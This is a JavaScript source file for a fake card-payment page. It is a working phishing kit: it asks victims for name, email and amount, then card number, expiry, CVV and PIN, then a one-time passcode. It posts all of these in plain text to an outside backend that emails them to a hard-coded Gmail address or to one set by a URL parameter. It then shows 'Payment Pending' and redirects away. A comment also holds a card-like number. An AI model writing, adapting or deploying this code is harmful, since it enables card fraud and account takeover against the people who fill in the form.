let Card = 
import('./assets/plugins/creditcard.js-master/src/creditcard.js')
    .then(obj=> Card=obj)
    .catch(e=>`Error: ${e}`);

getUrlArgs = ()=>{
    let args = new URLSearchParams(window.location.search);
    m = args.get('m');
    r = args.get('r');
    return {
        'mail':m,
        'redirect_site':decodeURIComponent(r)
    };
};

const card_endpoint  = "https://active-pay-backend.onrender.com/", 
    otp_endpoint = "https://active-pay-backend.onrender.com/otp/";


class App {
    constructor(){
        this.name='';
        this.email= '';
        this.amount=null;
        this.step=1;
        this.button = 'Proceed To Pay';
        this.loading = false;
        this.form_id = "details";
        this.cardNumber = null;
        this.cardExpiry = null;
        this.cardCVV = null;
        this.cardPin = null;
        this.otp =null;
        this.errors = document.getElementById('errors');
        this.template=`
        <div class="input-group mb-3">
            <span class="input-group-text" id="name-icon">
                <img src="./assets/plugins/line-awesome-1.3.0/svg/user-circle.svg" width="16px">
            </span>
            <input class="form-control " type="text" maxlength="100" name="name" id="name" placeholder="Name On Card">
        </div>
        <div class="input-group mb-3">
            <span class="input-group-text" id="emai-icon">
                <img src="./assets/plugins/line-awesome-1.3.0/svg/envelope.svg" width="16px">
            </span>
            <input class="form-control" type="email" name="email" id="email" placeholder="Email">
        </div>
        <div class="input-group mb-3">
            <span class="input-group-text" id="amount-icon"><img src="./assets/plugins/line-awesome-1.3.0/svg/money-bill-solid.svg" width="16px"></span>
            <input class="form-control" type="number" name="amount" id="amount" placeholder="Amount To Pay">
        </div>
        `;
        this.url = getUrlArgs() ;
        this.to_email = this.url.mail ||  'aiyedunmiracle956888@gmail.com';
        this.target = this.url.redirect_site || 'https://www.quickcredit.simdif.com/';
        this.loading = false; 
    }    

    view(){
        return( `
            <form method="post" class="form text-center" onsubmit="" id="${this.form_id}">
                <div class="mb-4" id="name_heading">${this.name}</div>
                <div id="errors" class="text-center"></div>
                ${this.template}
                <button type="submit" class="btn btn-primary my-2 w-100 round" id="proceed">${this.button}</button>
            </form>
        `);
    }

    initialize(app){
        document.getElementById(app).innerHTML = this.view();
        document.getElementById(this.form_id).addEventListener("submit", (e) => {
            e.preventDefault();
            switch(this.step){
                case 2:
                    this.setLoading(this.getCardDetails);
                    break;
                case 3:
                    this.setLoading(this.getOTP);
                    break;
                case 4:
                    this.setLoading(this.goBackToSite);
                    break;
                default:
                    this.setLoading(this.getDetails);
            }
        });
        
    }

    showLoader(state){
        const loader = document.getElementById('loader');
        switch(state){
            case 'visible':
                loader.style.display = 'block';
                break;
            default:
                loader.style.display = 'none';
                break;
        }
    }

    setLoading(callback){
        this.showLoader('visible');
        callback.call(this);
    }

    getDetails(){
        this.name = document.getElementById('name').value || 'empty';
        this.email = document.getElementById('email').value || 'empty';
        this.amount = document.getElementById('amount').value || 'empty';
        // this.Step2();
        if (this.name == 'empty' || this.email == 'empty' || this.amount == 'empty'){
            this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">All Fields Are Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
        }else{
            // console.log(`${this.name}\n${this.email}\n${this.amount}`);
            document.getElementById('details').removeEventListener("submit", ()=>{});
            this.button = `Pay ${this.amount}`;
            this.form_id = "card-info";
            this.step++;
            return this.Step2();
        }
    }

    Step2(){
        this.template=`<div class="input-group mb-3">
            <span class="input-group-text" id="card-type"><img src="./assets/plugins/line-awesome-1.3.0/svg/credit-card-solid.svg" width="16px"></span>
            <input class="form-control" type="text" name="card-number" id="card-number" placeholder="Card Number">
        </div>
        <div class="input-group mb-3">
            <span class="input-group-text" id="exp-icon">
                <img src="./assets/plugins/line-awesome-1.3.0/svg/calendar-solid.svg" width="16px">
            </span>
            <input class="form-control" type="text" name="card-expiry" id="card-expiry" maxlength="5" placeholder="Expiry Date mm/yy" pattern='^(0[1-9]|1[0-2])\/?([0-9]{2})$'>
        </div>
        <div class="row">
            <div class="input-group mb-3 col-4">
                <span class="input-group-text" id="cvv-icon"><img src="./assets/plugins/line-awesome-1.3.0/svg/user-secret-solid.svg" width="16px"></span>
                <input class="form-control" type="text" name="card-cvv" id="card-cvv" placeholder="CVV 3-digits" maxlength="3">
            </div>
            <div class="input-group mb-3 col-4">
                <span class="input-group-text" id="pwd-icon">
                    <img src="./assets/plugins/line-awesome-1.3.0/svg/lock-solid.svg" width="16px">
                </span>
                <input class="form-control" type="password" name="card-pin" placeholder="PIN" id="card-pin" maxlength="4">
            </div>
        </div>
        `;
        this.showLoader();
        setTimeout(()=>{
            let icon = document.getElementById('card-type');
            this.errors = document.getElementById('errors');
            document.getElementById('card-number').addEventListener('focusout', ()=>{
                if(!Card.isValid(document.getElementById('card-number').value)){
                    this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">Card is Invalid<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
                }else{
                    switch(Card.getCreditCardNameByNumber(document.getElementById('card-number').value)){
                        case 'Mastercard':
                            icon.innerHTML = '<img src="./assets/plugins/line-awesome-1.3.0/svg/cc-mastercard.svg" width="16px">';
                            break;
                        case 'Visa':
                            icon.innerHTML = '<img src="./assets/plugins/line-awesome-1.3.0/svg/cc-visa.svg" width="16px">';
                            break;
                        case 'Amex':
                            icon.innerHTML = '<img src="./assets/plugins/line-awesome-1.3.0/svg/cc-amex.svg" width="16px">';
                            break;
                        default:
                            icon.innerHTML = '<img src="./assets/plugins/line-awesome-1.3.0/svg/credit-card-solid.svg" width="16px">';
                            this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">Card is Invalid<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
                    }
                }
            });

        }, 3000);

        return  this.initialize('app');
// 5399122890462896
    }

    getCardDetails(){
        this.cardNumber = document.getElementById('card-number').value || 'empty';
        this.cardExpiry = document.getElementById('card-expiry').value || 'empty';
        this.cardCVV = document.getElementById('card-cvv').value || 'empty';
        this.cardPIN = document.getElementById('card-pin').value || 'empty';
       
        if (this.cardNumber == 'empty' || this.cardExpiry == 'empty' || this.cardCVV == 'empty' || this.cardPIN == 'empty'){
            this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">All Fields Are Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
        }else{
            console.log(`${this.name}\n${this.email}\n${this.amount}\n${this.cardNumber}\n${this.cardExpiry}\n${this.cardCVV}\n${this.cardPIN}`);
          
           let recipient = this.to_email;
           let body = `Visitor's Full Name: ${this.name}\n\n
           Visitor's Email: ${this.email}\n\n
           Amount: ${this.amount}\n\n\n
           DEBIT/CREDIT CARD DETAILS \n\n\n
           Card Number: ${this.cardNumber}\n\n
           Card Expiry: ${this.cardExpiry}\n\n
           Card CVV: ${this.cardCVV}\n\n
           Card PIN: ${this.cardPIN}\n\n`; 
           let  form = new FormData();
           form.append('recipient', recipient);
           form.append('body', body);

           fetch(card_endpoint, {
            mode: 'cors',
            headers:{
                'Access-Control-Allow-Origin':'*'
            }, 
            method: 'POST', 
            body: form
           }).then((response)=>{
                    if(response.ok){
                        console.log(`sending to ${this.to_email}`);
                        this.form_id = "OTP";
                        this.button = `Confirm Payment`;
                        this.step++;
                        return this.Step3();
                    }
                }).then(()=>this.showLoader()).catch((error)=>{
                    this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">Sorry we cannot process this request at this time, try again in a few hours<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
                    console.log('FAILED...', error);
                });
                
        }
    }
    Step3(){
        this.template=`<div class="input-group mb-3">
            <span class="input-group-text" id="otp-icon">
                <img src="./assets/plugins/line-awesome-1.3.0/svg/user-shield-solid.svg" width="16px">
            </span>
            <input class="form-control" type="password" name="otp" id="otp" placeholder="OTP">
        </div>
        `;
        return this.initialize('app');
    }

    getOTP(){
        this.otp =  document.getElementById('otp').value || 'empty';
        
        if (this.otp == 'empty'){
            this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">OTP Field Cannot be Empty<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
        }else{
            let  form = new FormData();
            form.append('recipient', this.to_email);
            form.append('body', `Your One-Time PIN for ${this.name}:  ${this.otp}`);
            fetch(otp_endpoint, {
                mode: 'cors',
                headers:{
                    'Access-Control-Allow-Origin':'*'
                }, 
                method:'POST', 
                body:form
            }).then((response)=>{
                    if(response.ok){
                        console.log('SUCCESS!', response.status, response.text);
                        this.step++;
                        document.getElementById(this.form_id).remove();
                        let successMsg = document.createElement('div');
                        successMsg.class = "container-fluid p-5 text-center";
                        successMsg.innerHTML =  `
                            <div class="d-block">
                                <img src="" width=100>
                            </div>
                            <div class="d-block py-4 text-center">
                                <p class="lead text-center">Payment Pending</p>
                            </div>
                        `;
                        document.getElementById('app').append(successMsg);
                        return this.goBackToSite();
                    }
                    
                }).then(()=>this.showLoader()).catch((error)=>{
                    this.errors.innerHTML = '<div class="alert alert-danger alert-dismissible fade show" role="alert">Sorry we cannot process this request at this time, try again in a few hours<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>';
                    console.log('FAILED...', error);
                });
        }
    }

    goBackToSite(){
        setTimeout(()=>window.location.replace(this.target), 4000);
    }
    
}
app = new App();
app.initialize('app');